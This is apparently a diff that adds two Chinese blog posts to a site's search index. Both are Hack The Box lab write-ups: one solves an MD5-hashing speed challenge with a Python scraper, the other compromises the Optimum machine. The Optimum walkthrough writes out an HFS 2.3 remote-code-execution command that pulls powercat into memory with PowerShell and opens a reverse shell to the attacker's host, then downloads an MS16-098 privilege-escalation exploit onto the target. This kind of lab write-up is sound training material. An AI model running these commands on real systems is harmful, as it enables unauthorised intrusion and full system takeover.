@@ -465,4 +465,107 @@
         <category>技战法</category>
       </categories>
   </entry>
+  <entry>
+    <title>HTB - Emdee five for life</title>
+    <url>/2021/01/24/HTB-Emdee-five-for-life/</url>
+    <content><![CDATA[<h2 id="0x00前言："><a href="#0x00前言：" class="headerlink" title="0x00前言："></a><strong><em>0x00前言：</em></strong></h2><p><strong><em>近期，在玩Hack The Box，遇到的一题。求解涉及简单爬虫，正好趁此重拾下python~</em></strong></p>
+<h2 id="0x01摸索过程："><a href="#0x01摸索过程：" class="headerlink" title="0x01摸索过程："></a><strong><em>0x01摸索过程：</em></strong></h2><p><strong><em>启动实例前稍稍瞄下，什么？Can you encrypt fast enough? 嗯。。。。</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/1.png" class>
+
+<p><strong><em>启动实例，打开链接出现网页，意思上看来是要把显示的字段MD5加密后post，但经手工测试，不管手速多快，都是显示 too  slow！？ 嗯。。。</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/2.png" class>
+
+<h2 id="0x02求解过程："><a href="#0x02求解过程：" class="headerlink" title="0x02求解过程："></a><strong><em>0x02求解过程：</em></strong></h2><p><strong><em>目前看来是要写个爬虫，爬取需加密的字段，经MD5加密后post回去呢。大体思路有了，先看下网页源码，看下post参数是啥</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/3.png" class>
+
+<p><strong><em>想想整个流程需要的python模块可以为：request、hashlib和BeautifulSoup，直击开干吧！</em></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># __author__=&#x27;lwof&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://68.183.34.159:30019&#x27;</span></span><br><span class="line">sessions = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geter</span>():</span></span><br><span class="line">	r = sessions.get(url = url)</span><br><span class="line">	soup = BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">	<span class="keyword">global</span> get</span><br><span class="line">	get = soup.h3.string</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dater</span>():</span></span><br><span class="line">	geter()</span><br><span class="line">	<span class="built_in">hash</span> = hashlib.md5(get.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">	<span class="keyword">global</span> data</span><br><span class="line">	data = &#123;<span class="string">&#x27;hash&#x27;</span>: <span class="built_in">hash</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poster</span>():</span></span><br><span class="line">	dater()</span><br><span class="line">	a = sessions.post(url = url,data = data )</span><br><span class="line">	print(a.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	poster()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()	</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>嘿嘿，直接获取到key~</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/4.png" class>
+
+<h2 id="0x03个人小结："><a href="#0x03个人小结：" class="headerlink" title="0x03个人小结："></a><strong><em>0x03个人小结：</em></strong></h2><p><strong><em>这题求解思路其实很简单，其中有个坑点是要用requests.session()去保持会话，新建会话又会返回too slow和新的需加密字段。但个人通过这题重拾了不少python的知识，还是要谢谢把这题发给我的那位朋友哈~</em></strong></p>
+]]></content>
+      <categories>
+        <category>安全实验</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>HTB-Optimum</title>
+    <url>/2021/01/24/HTB-Optimum/</url>
+    <content><![CDATA[<h2 id="0x00前言："><a href="#0x00前言：" class="headerlink" title="0x00前言："></a><strong><em>0x00前言：</em></strong></h2><p><strong><em>近期，在玩Hack The Box，遇到一个叫Optimum的靶机，第一次玩相关靶机全程不用msf，所以要记下来(<em>^▽^</em>)</em></strong></p>
+<h2 id="0x01探索阶段："><a href="#0x01探索阶段：" class="headerlink" title="0x01探索阶段："></a><strong><em>0x01探索阶段：</em></strong></h2><p><strong><em>靶机套路，废话不多说。先用祖传的nmap扫下</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -F -O -sV --version-light 10.10.10.8 </span><br></pre></td></tr></table></figure>
+
+<p><strong><em>扫出结果如下，发现存在80端口，且为2.3版本HFS。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-22 21:50 EST</span><br><span class="line">Nmap scan report for 10.10.10.8</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 99 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    HttpFileServer httpd 2.3</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.76 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>再searchsploit下</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -t hfs</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/1.png" class>
+
+<p><strong><em>查看下详情：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -t hfs -x windows&#x2F;remote&#x2F;39161.py</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/2.png" class>
+
+<p><strong><em>貌似是该py命令执行是基于nc.exe的，不方便的样子，找下其他exp。花了点功夫，找到一个用powershell的</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;49125</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/3.png" class>
+
+
+
+<h2 id="0x02突破阶段："><a href="#0x02突破阶段：" class="headerlink" title="0x02突破阶段："></a><strong><em>0x02突破阶段：</em></strong></h2><p><strong><em>因为该exp远程命令执行、靶机为windows、且网络只与kali相通。所以我的getshell思路是，远程命令利用powershell去下载kali里的powercat，然后反连nc。</em></strong></p>
+<p><strong><em>直接开干！！</em></strong></p>
+<p><strong><em>1、拉个powercat到kali先（<a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1%EF%BC%89">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1）</a></em></strong></p>
+<p><strong><em>2、kali开web服务：sudo python -m SimpleHTTPServer 80</em></strong></p>
+<p><strong><em>3、kali  开个nc： nc -lvvp 4444</em></strong></p>
+<p><strong><em>4、构造下远程执行利用语句：</em></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 <span class="number">10.10</span><span class="number">.10</span><span class="number">.8</span> <span class="number">80</span> <span class="string">&quot;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.33/powercat.ps1&#x27;); powercat -c 10.10.14.33 -p 6666 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/4.png" class>
+
+<p><strong><em>成功getshell！！！！</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/5.png" class>
+
+<p><strong><em>但貌似还只是低权限呢，只能抓个user.txt。。。。</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/6.png" class>
+
+
+
+<h2 id="0x03提权阶段："><a href="#0x03提权阶段：" class="headerlink" title="0x03提权阶段："></a><strong><em>0x03提权阶段：</em></strong></h2><p><strong><em>拿shell后，systeminfo一波后给Windows-Exploit-Suggester分析下</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/7.png" class>
+
+<img src="/2021/01/24/HTB-Optimum/8.png" class>
+
+<p><strong><em>踩了点坑后，将矛头直接对准ms16-098</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/9.png" class>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;41020</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/10.png" class>
+
+<img src="/2021/01/24/HTB-Optimum/11.png" class>
+
+<p><strong><em>下载到kali后，然后在shell上使用powershell传到靶机上去！</em></strong></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;Invoke-WebRequest -Uri http://10.10.14.33/bfill.exe -OutFile C:\Users\kostas\Desktop\bfill.exe</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/12.png" class>
+
+<p><strong><em>运行后直接变为system权限！</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/13.png" class>
+
+<p><strong><em>有权限后后切换administrator目录找到root.txt</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/14.png" class>
+
+
+
+<h2 id="0x04个人小结："><a href="#0x04个人小结：" class="headerlink" title="0x04个人小结："></a><strong><em>0x04个人小结：</em></strong></h2><p>该靶机的攻略过程看似中规中矩的，但在突破阶段在不使用msf的情况下找合适exp，及提权阶段的漏洞筛选、工具查找、及基于powershell的上传操作其实是坑点，个人在实操过程深有体会~~</p>
+]]></content>
+      <categories>
+        <category>安全实验</category>
+      </categories>
+  </entry>
 </search>
